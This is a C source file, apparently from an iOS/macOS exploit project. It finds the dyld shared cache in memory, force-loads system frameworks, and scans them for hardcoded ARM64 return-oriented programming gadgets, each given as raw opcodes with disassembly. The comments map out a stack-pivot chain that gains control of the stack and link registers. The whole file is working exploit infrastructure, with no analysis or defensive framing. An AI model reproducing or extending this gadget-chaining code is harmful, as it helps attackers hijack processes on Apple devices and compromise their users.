#include <dlfcn.h>
#include <mach-o/dyld.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "rop.h"
#include "tfc.h"

typedef struct dyld_text_range_s dyld_text_range_t;
struct dyld_text_range_s {
    vm_address_t start;
    vm_address_t end;
};

int is_part_of_dyldcache(vm_address_t addr) {

    vm_size_t size = 0;
    natural_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth, (vm_region_info_t)&info,
                             &info_cnt))
        return 0;
    if (info.share_mode == SM_TRUESHARED)
        return 1;
    return 0;
}

size_t get_loaded_dylib_size(void *dylib_address) {

    struct mach_header *mh = (struct mach_header *)dylib_address;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command *)((char *)mh + sizeof(struct mach_header_64));
    struct load_command *cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i) {
        switch (cmd->cmd) {
        case LC_SEGMENT_64: {
            struct segment_command_64 *seg = (struct segment_command_64 *)cmd;
            if (!strcmp(seg->segname, "__TEXT")) {
                return seg->vmsize;
            }
        } break;
        }
        cmd = (struct load_command *)((char *)cmd + cmd->cmdsize);
    }
    return 0;
}

lib_info_t lib_infos[] = {
    {"/usr/lib/libobjc.A.dylib", 0},
};

void fetch_text_range(dyld_text_range_t *range) {

    TFC_ASSERT(range != NULL);

    vm_address_t min_addr = 0;
    vm_address_t max_addr = 0;

    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        uint64_t addr = (uint64_t)_dyld_get_image_header(i);
        const char *name = _dyld_get_image_name(i);
        for (size_t i = 0; i < sizeof(lib_infos) / sizeof(lib_info_t); i++) {
            if (!strcmp(name, lib_infos[i].name) && !lib_infos[i].loaded_address) {
                lib_infos[i].loaded_address = addr;
                printf("[*] %s: 0x%llx\n", name, addr);
            }
        }
        /*printf("[*] %s\n", name);*/
        if (strncmp(name, "/System/", 8) && strncmp(name, "/usr/", 5))
            continue;
        if (!is_part_of_dyldcache(addr))
            continue;
        if (!min_addr || addr < min_addr)
            min_addr = addr;
        if (addr > max_addr)
            max_addr = addr;
    }

    TFC_ASSERT((min_addr != 0) || (max_addr != 0));

    size_t last_dylib_size = get_loaded_dylib_size((void *)max_addr);

    range->start = min_addr;
    range->end = max_addr + last_dylib_size;

    printf("[*] DYLD cache start: 0x%lx, end: 0x%lx\n", range->start, range->end);
}

const char *to_load_libraries[] = {
    "/System/Library/Frameworks/Foundation.framework/Foundation",
    "/System/Library/Frameworks/QuartzCore.framework/QuartzCore",
    "/usr/lib/libprotobuf.dylib",
    "/usr/lib/system/libdyld.dylib",
};

void force_loading_libraries() {

    for (size_t i = 0; i < sizeof(to_load_libraries) / sizeof(const char *); i++) {
        void *__unused handle = dlopen(to_load_libraries[i], RTLD_NOW);
    }
}

/**
 * Foundation
 *
 * ldp x8, x9, [x19, #0x38]
 * str x9, [sp, #0x20]
 * ldr x9, [x19, #0x28]
 * stp x9, x0, [sp, #0x28]
 * ldr x9, [x8, #0x10]
 * mov x2, sp
 * mov x0, x8
 * blr x9
 *
 */
uint32_t LDP_X8_X9_X19[] = {0xA943A668, 0xF90013E9, 0xF9401669, 0xA90283E9,
                            0xF9400909, 0x910003E2, 0xAA0803E0, 0xD63F0120};

/**
 * QuartzCore
 *
 * str x8, [sp]
 * ldr x8, [x0]
 * ldr x8, [x8, #0x10]
 * add x2, x29, #0x10
 * blr x8
 *
 */
uint32_t STR_x8_SP_LDRBR_X8[] = {0xF90003E8, 0xF9400008, 0xF9400908, 0x910043A2, 0xD63F0100};

/**
 * libprotobuf.dylib
 *
 * ldr x8, [x0]
 * ldr x1, [x8, #8]
 * ldp x29, x30, [sp], #0x10
 * br x1
 *
 */
uint32_t LDP_X29_X30_BR_X1[] = {0xF9400008, 0xF9400501, 0xA8C17BFD, 0xD61F0020};

/**
 * libsystem_c.dylib
 *
 * mov sp, x29
 * ldp x29, x30, [sp], #0x10
 * ret
 *
 */
uint32_t MOV_SP_X29_LD_X29_X30_SP[] = {0x910003BF, 0xA8C17BFD, 0xD65F03C0};

/**
 * libsystem_trace.dylib
 *
 * ldp x29, x30, [sp, #0x30]
 * ldp x20, x19, [sp, #0x20]
 * ldp x22, x21, [sp, #0x10]
 * add sp, sp, #0x40
 * ret
 *
 */
uint32_t AHEAD_SP_30[] = {0xA9437BFD, 0xA9424FF4, 0xA94157F6, 0x910103FF, 0xD65F03C0};

/**
 * libsystem_c.dylib
 *
 * ldr x0, [sp, #0x10]
 * ldr x1, [sp, #0x18]
 * ldp x29, x30, [sp, #0x30]
 * ldp x20, x19, [sp, #0x20]
 * add sp, sp, #0x40
 * ret
 *
 */
uint32_t LDR_X0_X1[] = {0xF9400BE0, 0xF9400FE1, 0xA9437BFD, 0xA9424FF4, 0x910103FF, 0xD65F03C0};

/**
 * libdyld.dylib
 *
 * ldp x5, x6, [sp], #0x10
 * ldp x3, x4, [sp], #0x10
 * ldp x1, x2, [sp], #0x10
 * mov sp, x29
 * ldp x29, x30, [sp], #0x10
 * ret
 *
 */
uint32_t LDR_X1_X2_X3_X4_X5_X6[] = {0xA8C11BE5, 0xA8C113E3, 0xA8C10BE1,
                                    0x910003BF, 0xA8C17BFD, 0xD65F03C0};

#define GADGET_MEMBER(var)                                                                         \
    { #var, var, sizeof(var) / sizeof(var[0]), 0 }

gadget_desc_t gadget_descs[] = {
    GADGET_MEMBER(LDP_X8_X9_X19),            // STEP1
    GADGET_MEMBER(STR_x8_SP_LDRBR_X8),       // STEP2
    GADGET_MEMBER(LDP_X29_X30_BR_X1),        // STEP3
    GADGET_MEMBER(MOV_SP_X29_LD_X29_X30_SP), // STEP4
    GADGET_MEMBER(AHEAD_SP_30),              // Now we totally control the stack, X29,X30

    GADGET_MEMBER(LDR_X0_X1),

    GADGET_MEMBER(LDR_X1_X2_X3_X4_X5_X6),
};

int rop_init() {

    /*TFC_ASSERT(length % 4 == 0);*/

    force_loading_libraries();

    dyld_text_range_t range;
    fetch_text_range(&range);

    size_t size = range.end - range.start;

    for (size_t i = 0; i < sizeof(gadget_descs) / sizeof(gadget_desc_t); i++) {
        void *addr = memmem((void *)range.start, size, gadget_descs[i].ins,
                            gadget_descs[i].count * sizeof(uint32_t));
        gadget_descs[i].address = (uint64_t)addr;
        printf("[*] %s: %p\n", gadget_descs[i].name, addr);
    }

    return 0;
}
